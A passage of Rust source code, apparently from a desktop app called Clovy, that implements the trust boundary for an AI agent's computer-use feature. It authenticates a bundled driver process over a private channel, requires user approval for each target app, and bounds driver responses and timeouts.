//! Clovy-owned Computer use trust boundary.
//!
//! The agent runtime reaches one internal tool broker. That server can only call the
//! authenticated native broker; it never receives the
//! bundled driver's path or a direct driver transport. The Rust broker owns a
//! private stdio child and requires one attended authorization for each target
//! app used by the current task. This is intentionally structural: a model prompt, inherited
//! environment variable, or unrestricted agent process cannot bypass it.

use crate::computer_use_policy::blocked_app;
use crate::domain::types::AppError;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
use rand::{distributions::Alphanumeric, Rng};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
#[cfg(target_os = "macos")]
use std::sync::atomic::AtomicUsize;
use std::{
    collections::{HashMap, HashSet},
    ffi::OsStr,
    future::Future,
    io::{self, Write},
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering},
        Arc, Mutex, OnceLock,
    },
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};
use tauri::{AppHandle, Emitter, Manager, State};
#[cfg(any(target_os = "macos", target_os = "windows", test))]
use tokio::io::BufReader;
#[cfg(any(target_os = "macos", target_os = "windows"))]
use tokio::io::{AsyncWriteExt, BufWriter};
#[cfg(target_os = "macos")]
use tokio::net::{unix::OwnedReadHalf, unix::OwnedWriteHalf, UnixStream};
use tokio::{
    io::{AsyncBufRead, AsyncBufReadExt, AsyncReadExt},
    process::Command,
    sync::{oneshot, watch, Mutex as AsyncMutex},
};

/// Compatibility identity for restored runs created before Computer use moved
/// from a Clovy-owned MCP server to host tools in ADR-0040.
pub const LEGACY_MCP_SERVER_NAME: &str = "june_computer_use";
pub const APPROVALS_CHANGED_EVENT: &str = "clovy://computer-use-approvals-changed";

#[cfg(not(debug_assertions))]
const GRANT_FILE_NAME: &str = "computer-use-grant-v1";
const APPROVAL_TIMEOUT: Duration = Duration::from_secs(600);
const DRIVER_CALL_TIMEOUT: Duration = Duration::from_secs(45);
const DRIVER_START_TIMEOUT: Duration = Duration::from_secs(12);
const EXTERNAL_COMMAND_TIMEOUT: Duration = Duration::from_secs(2);
const SIGNATURE_VERIFICATION_TIMEOUT: Duration = Duration::from_secs(15);
const SIGNATURE_TERMINATION_GRACE: Duration = Duration::from_millis(250);
const SIGNATURE_REAP_TIMEOUT: Duration = Duration::from_secs(1);
const SHUTDOWN_MUTEX_TIMEOUT: Duration = Duration::from_millis(250);
const DRIVER_SHUTDOWN_TIMEOUT: Duration = Duration::from_millis(250);
const DRIVER_KILL_TIMEOUT: Duration = Duration::from_secs(1);
const DRIVER_MAX_LINE_BYTES: usize = 24 * 1024 * 1024;
const SCREENSHOT_MAX_BYTES: usize = 12 * 1024 * 1024;
const DEFAULT_MAX_ELEMENTS: usize = 100;
const MAX_ELEMENTS: usize = 1000;
const RELEASE_SELF_TEST_MAX_LINE_BYTES: usize = 256 * 1024;

#[cfg(target_os = "macos")]
static MAIN_WINDOW_ORIGINAL_COLLECTION_BEHAVIOR: AtomicUsize = AtomicUsize::new(usize::MAX);

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
struct DriverPin {
    version: String,
    source_commit: String,
    bundle_name: String,
    executable: String,
}

fn driver_pin() -> DriverPin {
    serde_json::from_str(include_str!("../agent-desktop-pin.json"))
        .expect("agent-desktop-pin.json must be valid")
}

#[derive(Default)]
pub struct ComputerUseState {
    browser_runtime: OnceLock<crate::computer_use_owned_runtime::OwnedBrowserRuntime>,
    operation: AsyncMutex<()>,
    driver: AsyncMutex<Option<DriverClient>>,
    permission_probe: Arc<PermissionProbeCoordinator>,
    signature_verification: AsyncMutex<Option<CachedBundleSignature>>,
    driver_pid: AtomicU32,
    #[cfg(target_os = "macos")]
    driver_run_directory: Mutex<Option<PathBuf>>,
    #[cfg(target_os = "macos")]
    driver_socket: Mutex<Option<Arc<std::os::unix::net::UnixStream>>>,
    /// A helper and its engine refs belong to exactly one broker epoch.
    driver_epoch: AtomicU64,
    #[cfg(target_os = "windows")]
    driver_cancel: Mutex<Option<crate::computer_use_windows::JobCancel>>,
    target: Mutex<Option<TargetContext>>,
    /// Owner of the transient target and authorizations while an operation is
    /// running. Access is serialized by `operation`; the lease remains the
    /// authority and is rechecked after each asynchronous boundary.
    active_turn: Mutex<Option<String>>,
    approvals: Mutex<HashMap<String, PendingEntry>>,
    authorized_apps: Mutex<HashSet<AppAuthorizationKey>>,
    attended_runs: Mutex<HashSet<String>>,
    /// CLI turns by run id ([`begin_turn_lease`]): a granted run whose lease
    /// is gone was stopped and stays stopped; an ended run never gets one.
    turn_leases: Mutex<HashMap<String, TurnLease>>,
    attended_generation: AtomicU64,
    cleanup_in_progress: AtomicU32,
    epoch: AtomicU64,
    epoch_changed: tokio::sync::Notify,
    cursor: crate::computer_use_cursor::ComputerUseCursorState,
    capture_generation: AtomicU64,
    runtime_ready_state: AtomicU32,
    runtime_ready_epoch: AtomicU64,
    runtime_ready_publish: Mutex<()>,
    driver_prewarm_in_flight: AtomicBool,
}

impl ComputerUseState {
    fn browser_runtime(
        &self,
    ) -> Result<&crate::computer_use_owned_runtime::OwnedBrowserRuntime, AppError> {
        self.browser_runtime.get().ok_or_else(|| {
            AppError::new(
                "computer_use_unavailable",
                "Browser authority is unavailable.",
            )
        })
    }

    pub(crate) fn set_browser_runtime(
        &self,
        runtime: crate::computer_use_owned_runtime::OwnedBrowserRuntime,
    ) -> Result<(), AppError> {
        self.browser_runtime.set(runtime).map_err(|_| {
            AppError::new(
                "computer_use_unavailable",
                "Browser authority is already configured.",
            )
        })
    }

    pub(crate) fn current_epoch(&self) -> u64 {
        self.epoch.load(Ordering::SeqCst)
    }

    pub(crate) fn cursor(&self) -> &crate::computer_use_cursor::ComputerUseCursorState {
        &self.cursor
    }
}

#[derive(Debug, Clone)]
struct TargetContext {
    pid: i64,
    window_id: u64,
    app_name: String,
    identity: AppIdentity,
    native_owner: Option<NativeOwnerIdentity>,
    elements: HashMap<u32, ElementSummary>,
    capture_path: Option<String>,
    capture_sha256: Option<String>,
    capture_generation: u64,
    bounds: crate::computer_use_cursor::ScreenRect,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
struct NativeOwnerIdentity {
    pid: u32,
    instance: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ElementSummary {
    role: String,
    label: String,
    metadata: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct AppIdentity {
    bundle_id: String,
    executable_path: PathBuf,
    process_creation: u64,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
enum AppAuthorizationKey {
    Identity(AppIdentity),
    RequestedName(String),
}

struct PendingEntry {
    approval: PendingComputerUseApproval,
    responder: oneshot::Sender<bool>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PendingComputerUseApproval {
    pub approval_id: String,
    pub action_id: String,
    pub action: String,
    pub target_app: String,
    pub summary: String,
    pub capture_path: Option<String>,
    pub requested_at_ms: u64,
    pub expires_at_ms: u64,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ComputerUseStatus {
    pub platform: &'static str,
    pub platform_supported: bool,
    pub grant_enabled: bool,
    pub driver_available: bool,
    pub driver_version: Option<String>,
    pub accessibility: bool,
    pub screen_recording: bool,
    pub ready: bool,
    pub state: String,
    pub error: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ComputerUseStopResult {
    pub stopped: bool,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SetComputerUseGrantRequest {
    pub enabled: bool,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RespondComputerUseApprovalRequest {
    pub approval_id: String,
    pub approve: bool,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ComputerUseRunRequest {
    pub session_id: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct PermissionProbe {
    accessibility: bool,
    screen_recording: bool,
}

#[derive(Debug, PartialEq, Eq)]
struct PermissionProbeStatus {
    accessibility: bool,
    screen_recording: bool,
    ready: bool,
    state: &'static str,
    error: Option<String>,
}

#[derive(Default)]
struct PermissionProbeCoordinator {
    active: AsyncMutex<Option<ActivePermissionProbe>>,
    next_id: AtomicU64,
}

struct ActivePermissionProbe {
    id: u64,
    prompt: bool,
    result: watch::Receiver<Option<Result<PermissionProbe, AppError>>>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct FileFingerprint {
    path: PathBuf,
    length: u64,
    modified_ns: u128,
    #[cfg(unix)]
    device: u64,
    #[cfg(unix)]
    inode: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct BundleFingerprint {
    outer_executable: FileFingerprint,
    outer_resources: FileFingerprint,
    helper_executable: FileFingerprint,
    helper_resources: FileFingerprint,
}

struct PackagedDriverBundles {
    outer: PathBuf,
    helper: PathBuf,
    fingerprint: BundleFingerprint,
}

#[derive(Debug, Clone)]
struct CachedBundleSignature {
    fingerprint: BundleFingerprint,
}

impl PermissionProbeCoordinator {
    async fn run<F, Fut>(
        self: &Arc<Self>,
        prompt: bool,
        probe: F,
    ) -> Result<PermissionProbe, AppError>
    where
        F: Fn(bool) -> Fut + Clone + Send + Sync + 'static,
        Fut: Future<Output = Result<PermissionProbe, AppError>> + Send + 'static,
    {
        loop {
            let (receiver, active_prompt) = {
                let mut active = self.active.lock().await;
                if let Some(active) = active.as_ref() {
                    (active.result.clone(), active.prompt)
                } else {
                    let id = self.next_id.fetch_add(1, Ordering::SeqCst);
                    let (sender, receiver) = watch::channel(None);
                    *active = Some(ActivePermissionProbe {
                        id,
                        prompt,
                        result: receiver.clone(),
                    });
                    let coordinator = Arc::clone(self);
                    let run_probe = probe.clone();
                    tauri::async_runtime::spawn(async move {
                        let result = run_probe(prompt).await;
                        // Publish while this flight is still discoverable. A
                        // caller in this handoff window must share the completed
                        // result instead of starting an overlapping probe.
                        let _ = sender.send(Some(result));
                        let mut active = coordinator.active.lock().await;
                        if active.as_ref().is_some_and(|active| active.id == id) {
                            *active = None;
                        }
                    });
                    (receiver, prompt)
                }
            };

            let result = wait_for_permission_probe(receiver).await?;
            if prompt && !active_prompt && next_permission_prompt(&result).is_some() {
                // A user request that arrived during a background status
                // refresh shares that refresh first, then owns the one prompt
                // it still needs after the background flight has completed.
                continue;
            }
            return Ok(result);
        }
    }
}

async fn wait_for_permission_probe(
    mut receiver: watch::Receiver<Option<Result<PermissionProbe, AppError>>>,
) -> Result<PermissionProbe, AppError> {
    loop {
        if let Some(result) = receiver.borrow().clone() {
            return result;
        }
        receiver.changed().await.map_err(|_| {
            AppError::new(
                "computer_use_driver_stopped",
                "The Computer use permission probe stopped unexpectedly.",
            )
        })?;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DriverPermissionPrompt {
    Accessibility,
    ScreenRecording,
}

impl DriverPermissionPrompt {
    fn as_env_value(self) -> &'static str {
        match self {
            Self::Accessibility => "accessibility",
            Self::ScreenRecording => "screen-recording",
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
struct DriverLaunchSpec {
    program: PathBuf,
    args: Vec<String>,
}

struct CleanupInProgress<'a>(&'a AtomicU32);

impl<'a> CleanupInProgress<'a> {
    fn begin(counter: &'a AtomicU32) -> Self {
        counter.fetch_add(1, Ordering::SeqCst);
        Self(counter)
    }
}

impl Drop for CleanupInProgress<'_> {
    fn drop(&mut self) {
        self.0.fetch_sub(1, Ordering::SeqCst);
    }
}

struct DriverPrewarmInProgress<'a>(&'a AtomicBool);

impl<'a> DriverPrewarmInProgress<'a> {
    fn try_begin(flag: &'a AtomicBool) -> bool {
        flag.compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
            .is_ok()
    }
}

impl Drop for DriverPrewarmInProgress<'_> {
    fn drop(&mut self) {
        self.0.store(false, Ordering::Release);
    }
}

#[cfg(debug_assertions)]
static DEVELOPMENT_GRANT: AtomicBool = AtomicBool::new(false);

#[derive(Debug, PartialEq, Eq)]
enum BoundedLine {
    Eof,
    Line(String),
    TooLarge,
}

async fn read_bounded_line<R>(reader: &mut R, max_bytes: usize) -> io::Result<BoundedLine>
where
    R: AsyncBufRead + Unpin,
{
    // `read_line` alone can buffer an unbounded line. Limit the view to one
    // byte beyond the contract so an unterminated response cannot exhaust the
    // app before the size check runs.
    let mut bytes = Vec::with_capacity(max_bytes.min(8 * 1024));
    let limit = u64::try_from(max_bytes)
        .unwrap_or(u64::MAX)
        .saturating_add(1);
    let read = reader.take(limit).read_until(b'\n', &mut bytes).await?;
    if read == 0 {
        return Ok(BoundedLine::Eof);
    }
    if read > max_bytes {
        return Ok(BoundedLine::TooLarge);
    }
    String::from_utf8(bytes)
        .map(BoundedLine::Line)
        .map_err(|error| io::Error::new(io::ErrorKind::InvalidData, error))
}

#[cfg(target_os = "macos")]
struct DriverClient {
    stdin: OwnedWriteHalf,
    stdout: BufReader<OwnedReadHalf>,
    next_id: u64,
    pid: u32,
    socket_dir: PathBuf,
    _run_directory: tempfile::TempDir,
    control_socket: Arc<std::os::unix::net::UnixStream>,
}

#[cfg(target_os = "macos")]
impl DriverClient {
    async fn start(
        path: &Path,
        permission_prompt: Option<DriverPermissionPrompt>,
        browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
    ) -> Result<Self, AppError> {
        let capability = random_id();
        let run_directory = tempfile::Builder::new()
            .prefix("clovy-desktop-")
            .tempdir_in("/tmp")
            .map_err(|error| {
                AppError::new(
                    "computer_use_driver_start_failed",
                    format!("Could not prepare the Computer use driver channel. {error}"),
                )
            })?;
        let socket_dir = run_directory.path().to_path_buf();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&socket_dir, std::fs::Permissions::from_mode(0o700)).map_err(
                |error| {
                    AppError::new(
                        "computer_use_driver_start_failed",
                        format!("Could not secure the Computer use driver channel. {error}"),
                    )
                },
            )?;
        }
        let socket_path = socket_dir.join("driver.sock");
        let launch = driver_launch_spec(
            path,
            &socket_path,
            &capability,
            permission_prompt,
            browser_runtime,
        )?;
        let mut command = driver_command(&launch.program);
        command.args(&launch.args);
        let output = bounded_command_output(
            command,
            EXTERNAL_COMMAND_TIMEOUT,
            "computer_use_driver_start_failed",
            "Could not launch the bundled Computer use driver.",
        )
        .await?;
        if !output.status.success() {
            let _ = std::fs::remove_dir_all(&socket_dir);
            return Err(AppError::new(
                "computer_use_driver_start_failed",
                format!(
                    "Could not launch the bundled Computer use driver. {}",
                    String::from_utf8_lossy(&output.stderr).trim()
                ),
            ));
        }

        let stream = connect_driver_socket(&socket_path).await.map_err(|error| {
            let _ = std::fs::remove_dir_all(&socket_dir);
            AppError::new(
                "computer_use_driver_start_failed",
                format!("The Computer use driver did not open its private channel. {error}"),
            )
        })?;
        let pid = stream
            .peer_cred()
            .ok()
            .and_then(|credentials| credentials.pid())
            .and_then(|pid| u32::try_from(pid).ok())
            .ok_or_else(|| {
                let _ = std::fs::remove_dir_all(&socket_dir);
                AppError::new(
                    "computer_use_driver_start_failed",
                    "The private Computer use channel was not owned by Clovy's bundled driver.",
                )
            })?;
        if !process_executable_path(pid as libc::pid_t)
            .is_some_and(|actual| same_path(&actual, path))
            || !process_group_is_owned(pid)
        {
            let _ = std::fs::remove_dir_all(&socket_dir);
            return Err(AppError::new(
                "computer_use_driver_start_failed",
                "The private Computer use channel did not have the expected isolated driver identity.",
            ));
        }
        let expected_helper = option_env!("CLOVY_COMPUTER_USE_HELPER_CDHASH").ok_or_else(|| {
            AppError::new(
                "computer_use_driver_start_failed",
                "This build omitted the signed Computer use helper identity.",
            )
        })?;
        crate::computer_use_macos::verify_mapped_image(pid, expected_helper).map_err(|_| {
            AppError::new(
                "computer_use_driver_start_failed",
                "The connected Computer use helper does not match this build.",
            )
        })?;
        let native_stream = stream.into_std().map_err(|error| {
            AppError::new("computer_use_driver_start_failed", error.to_string())
        })?;
        let control_socket = Arc::new(native_stream.try_clone().map_err(|error| {
            AppError::new("computer_use_driver_start_failed", error.to_string())
        })?);
        let stream = UnixStream::from_std(native_stream).map_err(|error| {
            AppError::new("computer_use_driver_start_failed", error.to_string())
        })?;
        let (stdout, stdin) = stream.into_split();
        let mut client = Self {
            stdin,
            stdout: BufReader::new(stdout),
            next_id: 1,
            pid,
            socket_dir,
            _run_directory: run_directory,
            control_socket,
        };
        let mut ignore_notification = |_: &Value| {};
        client
            .request(
                "initialize",
                json!({
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "experimental": {
                            "clovyComputerUseCapability": capability
                        }
                    },
                    "clientInfo": { "name": "Clovy", "version": env!("CARGO_PKG_VERSION") }
                }),
                &mut ignore_notification,
            )
            .await?;
        client
            .notify("notifications/initialized", json!({}))
            .await?;
        Ok(client)
    }

    fn pid(&self) -> u32 {
        self.pid
    }

    fn terminate(&mut self) {
        let _ = self.control_socket.shutdown(std::net::Shutdown::Both);
        if self.pid > 0 {
            crate::computer_use_macos::terminate_owned_group(self.pid, &self.socket_dir);
        }
    }
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
impl DriverClient {
    async fn request(
        &mut self,
        method: &str,
        params: Value,
        on_notification: &mut (dyn FnMut(&Value) + Send),
    ) -> Result<Value, AppError> {
        let id = self.next_id;
        self.next_id = self.next_id.saturating_add(1);
        self.write_message(json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": method,
            "params": params,
        }))
        .await?;
        let response =
            tokio::time::timeout(DRIVER_CALL_TIMEOUT, self.read_response(id, on_notification))
                .await
                .map_err(|_| {
                    self.terminate();
                    AppError::new(
                        "computer_use_driver_timeout",
                        "The Computer use driver did not respond in time.",
                    )
                })??;
        if let Some(error) = response.get("error") {
            return Err(AppError::new(
                "computer_use_driver_failed",
                mcp_error_message(error),
            ));
        }
        Ok(response)
    }

    async fn call_tool(
        &mut self,
        name: &str,
        arguments: Value,
        on_notification: &mut (dyn FnMut(&Value) + Send),
    ) -> Result<Value, AppError> {
        let response = self
            .request(
                "tools/call",
                json!({ "name": name, "arguments": arguments }),
                on_notification,
            )
            .await?;
        let result = response.get("result").cloned().ok_or_else(|| {
            AppError::new(
                "computer_use_driver_invalid_response",
                "The Computer use driver returned no result.",
            )
        })?;
        if !result.is_object() {
            return Err(AppError::new(
                "computer_use_driver_invalid_response",
                "The Computer use driver returned an invalid result.",
            ));
        }
        if result
            .get("isError")
            .or_else(|| result.get("is_error"))
            .and_then(Value::as_bool)
            .unwrap_or(false)
        {
            return Err(driver_result_error(&result));
        }
        Ok(result)
    }

    async fn notify(&mut self, method: &str, params: Value) -> Result<(), AppError> {
        self.write_message(json!({ "jsonrpc": "2.0", "method": method, "params": params }))
            .await
    }

    async fn write_message(&mut self, value: Value) -> Result<(), AppError> {
        let mut line = serde_json::to_vec(&value).map_err(|error| {
            AppError::new("computer_use_driver_protocol_failed", error.to_string())
        })?;
        line.push(b'\n');
        self.stdin.write_all(&line).await.map_err(|error| {
            AppError::new("computer_use_driver_write_failed", error.to_string())
        })?;
        self.stdin
            .flush()
            .await
            .map_err(|error| AppError::new("computer_use_driver_write_failed", error.to_string()))
    }

    async fn read_response(
        &mut self,
        id: u64,
        on_notification: &mut (dyn FnMut(&Value) + Send),
    ) -> Result<Value, AppError> {
        loop {
            let line = match read_bounded_line(&mut self.stdout, DRIVER_MAX_LINE_BYTES)
                .await
                .map_err(|error| {
                    AppError::new("computer_use_driver_read_failed", error.to_string())
                })? {
                BoundedLine::Eof => {
                    return Err(AppError::new(
                        "computer_use_driver_stopped",
                        "The Computer use driver stopped unexpectedly.",
                    ));
                }
                BoundedLine::TooLarge => {
                    self.terminate();
                    return Err(AppError::new(
                        "computer_use_driver_response_too_large",
                        "The Computer use driver returned an oversized response.",
                    ));
                }
                BoundedLine::Line(line) => line,
            };
            let Ok(value) = serde_json::from_str::<Value>(&line) else {
                continue;
            };
            if value.get("id").is_none() && value.get("method").is_some() {
                on_notification(&value);
                continue;
            }
            if value.get("id").and_then(Value::as_u64) == Some(id) {
                return Ok(value);
            }
        }
    }
}

#[cfg(target_os = "macos")]
impl DriverClient {
    async fn stop(mut self) {
        let _ = tokio::time::timeout(DRIVER_SHUTDOWN_TIMEOUT, self.stdin.shutdown()).await;
        if !wait_for_process_exit(self.pid, DRIVER_SHUTDOWN_TIMEOUT).await {
            self.terminate();
        }
        if !wait_for_process_exit(self.pid, DRIVER_SHUTDOWN_TIMEOUT).await {
            crate::computer_use_macos::terminate_owned_group(self.pid, &self.socket_dir);
        }
        if !wait_for_process_exit(self.pid, DRIVER_KILL_TIMEOUT).await {
            tracing::warn!(
                pid = self.pid,
                "Computer use driver process group did not exit"
            );
        }
        self.pid = 0;
        let _ = tokio::fs::remove_dir_all(&self.socket_dir).await;
    }
}

#[cfg(target_os = "macos")]
impl Drop for DriverClient {
    fn drop(&mut self) {
        let _ = self.control_socket.shutdown(std::net::Shutdown::Both);
        if self.pid > 0 {
            crate::computer_use_macos::terminate_owned_group(self.pid, &self.socket_dir);
            self.pid = 0;
        }
        let _ = std::fs::remove_dir_all(&self.socket_dir);
    }
}

#[cfg(target_os = "windows")]
struct DriverClient {
    stdin: tokio::process::ChildStdin,
    stdout: BufReader<tokio::process::ChildStdout>,
    next_id: u64,
    pid: u32,
    helper: crate::computer_use_windows::PrivateHelper,
}

#[cfg(target_os = "windows")]
impl DriverClient {
    async fn start(
        path: &Path,
        _permission_prompt: Option<DriverPermissionPrompt>,
        browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
    ) -> Result<Self, AppError> {
        let capability = random_id();
        let mut helper =
            crate::computer_use_windows::PrivateHelper::spawn(path, &capability, browser_runtime)
                .await
                .map_err(|error| {
                    AppError::new("computer_use_driver_start_failed", error.to_string())
                })?;
        let stdin = helper.stdin.take().ok_or_else(|| {
            AppError::new(
                "computer_use_driver_start_failed",
                "Private helper input pipe is missing.",
            )
        })?;
        let stdout = helper.stdout.take().ok_or_else(|| {
            AppError::new(
                "computer_use_driver_start_failed",
                "Private helper output pipe is missing.",
            )
        })?;
        let mut client = Self {
            stdin,
            stdout: BufReader::new(stdout),
            next_id: 1,
            pid: helper.pid(),
            helper,
        };
        let mut ignore = |_: &Value| {};
        client.request("initialize", json!({
            "protocolVersion": "2024-11-05",
            "capabilities": { "experimental": { "clovyComputerUseCapability": capability } },
            "clientInfo": { "name": "Clovy", "version": env!("CARGO_PKG_VERSION") }
        }), &mut ignore).await?;
        client
            .notify("notifications/initialized", json!({}))
            .await?;
        Ok(client)
    }

    fn pid(&self) -> u32 {
        self.pid
    }
    fn cancel_handle(&self) -> crate::computer_use_windows::JobCancel {
        self.helper.cancel_handle()
    }
    fn terminate(&mut self) {
        self.helper.cancel_handle().cancel();
    }
    async fn stop(mut self) {
        self.terminate();
        let _ = self.stdin.shutdown().await;
        self.helper.stop().await;
    }
}

#[cfg(not(any(target_os = "macos", target_os = "windows")))]
struct DriverClient;

#[cfg(not(any(target_os = "macos", target_os = "windows")))]
impl DriverClient {
    async fn start(
        _path: &Path,
        _permission_prompt: Option<DriverPermissionPrompt>,
        _browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
    ) -> Result<Self, AppError> {
        Err(AppError::new(
            "computer_use_unsupported",
            "Computer use requires macOS or Windows.",
        ))
    }

    fn pid(&self) -> u32 {
        0
    }

    async fn request(
        &mut self,
        _method: &str,
        _params: Value,
        _on_notification: &mut (dyn FnMut(&Value) + Send),
    ) -> Result<Value, AppError> {
        Err(AppError::new(
            "computer_use_unsupported",
            "Computer use requires macOS or Windows.",
        ))
    }

    async fn call_tool(
        &mut self,
        _name: &str,
        _arguments: Value,
        _on_notification: &mut (dyn FnMut(&Value) + Send),
    ) -> Result<Value, AppError> {
        Err(AppError::new(
            "computer_use_unsupported",
            "Computer use requires macOS or Windows.",
        ))
    }

    async fn stop(self) {}
}

/// Fixed release-only QA bridge. It runs as Clovy's real signed executable so
/// the nested helper can authenticate its parent, but it can operate only the
/// two disposable fixture bundle identifiers created by the release test.
/// This deliberately is not a general driver proxy.
#[cfg(any(target_os = "macos", target_os = "windows"))]
pub async fn run_release_self_test_host(
    path: PathBuf,
    permission_prompt: Option<String>,
) -> Result<(), String> {
    if !release_self_test_driver_path_allowed(&path) {
        return Err("the self-test host accepts only Clovy's bundled helper".to_string());
    }
    let permission_prompt = match permission_prompt.as_deref() {
        None => None,
        Some("accessibility") => Some(DriverPermissionPrompt::Accessibility),
        Some("screen-recording") => Some(DriverPermissionPrompt::ScreenRecording),
        Some(_) => return Err("the self-test permission prompt is invalid".to_string()),
    };
    let host_executable = std::env::current_exe().map_err(|error| error.to_string())?;
    #[cfg(target_os = "macos")]
    let bundled = host_executable
        .parent()
        .and_then(Path::parent)
        .map(|contents| contents.join("Resources/native/agent-browser"));
    #[cfg(target_os = "windows")]
    let bundled = host_executable
        .parent()
        .map(|parent| parent.join("native/agent-browser"));
    let bundled = bundled.ok_or("Browser resources are unavailable")?;
    let resources = if cfg!(debug_assertions) && !bundled.is_dir() {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../resources/agent-browser")
    } else {
        bundled
    };
    let (engine, chrome) = crate::browser::engine::EngineConfig::production_paths(resources);
    let state = ComputerUseState::default();
    state
        .set_browser_runtime(crate::computer_use_owned_runtime::OwnedBrowserRuntime::new(
            engine
                .parent()
                .ok_or("Browser resources are unavailable")?
                .join("chrome"),
            chrome,
        ))
        .map_err(|error| error.message)?;
    let mut driver = DriverClient::start(
        &path,
        permission_prompt,
        state.browser_runtime().map_err(|error| error.message)?,
    )
    .await
    .map_err(|error| error.message)?;
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin);
    let mut stdout = BufWriter::new(tokio::io::stdout());

    loop {
        let line = match read_bounded_line(&mut reader, RELEASE_SELF_TEST_MAX_LINE_BYTES)
            .await
            .map_err(|error| error.to_string())?
        {
            BoundedLine::Eof => break,
            BoundedLine::TooLarge => {
                write_release_self_test_response(
                    &mut stdout,
                    json!({"jsonrpc": "2.0", "id": null, "error": {"code": -32700, "message": "Oversized request."}}),
                )
                .await?;
                break;
            }
            BoundedLine::Line(line) => line,
        };
        let request: Value = match serde_json::from_str(line.trim()) {
            Ok(request) => request,
            Err(_) => {
                write_release_self_test_response(
                    &mut stdout,
                    json!({"jsonrpc": "2.0", "id": null, "error": {"code": -32700, "message": "Parse error."}}),
                )
                .await?;
                continue;
            }
        };
        let Some(id) = request.get("id").cloned() else {
            continue;
        };
        let method = request.get("method").and_then(Value::as_str).unwrap_or("");
        let params = request.get("params").cloned().unwrap_or_else(|| json!({}));
        let response = match method {
            "initialize" => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {"tools": {}},
                    "serverInfo": {"name": "Clovy Computer Use Release Self-Test", "version": env!("CARGO_PKG_VERSION")}
                }
            }),
            "tools/list" => {
                let mut ignore_notification = |_: &Value| {};
                match driver
                    .request("tools/list", json!({}), &mut ignore_notification)
                    .await
                {
                    Ok(driver_response) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": driver_response.get("result").cloned().unwrap_or_else(|| json!({"tools": []}))
                    }),
                    Err(error) => release_self_test_error(id, -32000, &error.message),
                }
            }
            "tools/call" => {
                let name = params.get("name").and_then(Value::as_str).unwrap_or("");
                let arguments = params
                    .get("arguments")
                    .cloned()
                    .unwrap_or_else(|| json!({}));
                if !release_self_test_call_allowed(name, &arguments) {
                    release_self_test_error(
                        id,
                        -32602,
                        "Release self-test calls are limited to Clovy's disposable fixtures.",
                    )
                } else {
                    let mut ignore_notification = |_: &Value| {};
                    match driver
                        .call_tool(name, arguments.clone(), &mut ignore_notification)
                        .await
                    {
                        Ok(result) => {
                            match sanitize_release_self_test_result(name, &arguments, result) {
                                Some(result) => {
                                    json!({"jsonrpc": "2.0", "id": id, "result": result})
                                }
                                None => release_self_test_error(
                                    id,
                                    -32000,
                                    "The driver returned an invalid release self-test result.",
                                ),
                            }
                        }
                        Err(error) => release_self_test_error(id, -32000, &error.message),
                    }
                }
            }
            _ => release_self_test_error(id, -32601, "Method not found."),
        };
        write_release_self_test_response(&mut stdout, response).await?;
    }
    driver.stop().await;
    Ok(())
}

#[cfg(target_os = "macos")]
fn release_self_test_driver_path_allowed(path: &Path) -> bool {
    let expected = if cfg!(debug_assertions) {
        Path::new(env!("CARGO_MANIFEST_DIR")).parent().map(|repo| {
            repo.join(".tauri-helper")
                .join("Clovy Computer Use Driver.app")
                .join("Contents")
                .join("MacOS")
                .join("clovy-computer-use-driver")
        })
    } else {
        std::env::current_exe().ok().and_then(|current| {
            let contents = current.parent()?.parent()?;
            Some(
                contents
                    .join("Resources")
                    .join("native")
                    .join("bin")
                    .join("Clovy Computer Use Driver.app")
                    .join("Contents")
                    .join("MacOS")
                    .join("clovy-computer-use-driver"),
            )
        })
    };
    expected.is_some_and(|expected| same_path(path, &expected))
}

#[cfg(target_os = "windows")]
fn release_self_test_driver_path_allowed(path: &Path) -> bool {
    let expected = if cfg!(debug_assertions) {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .map(|repo| repo.join(".tauri-helper/computer-use/clovy-computer-use-driver.exe"))
    } else {
        std::env::current_exe().ok().and_then(|exe| {
            Some(
                exe.parent()?
                    .join("native/bin/computer-use/clovy-computer-use-driver.exe"),
            )
        })
    };
    expected.is_some_and(|expected| same_path(path, &expected))
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
fn same_path(left: &Path, right: &Path) -> bool {
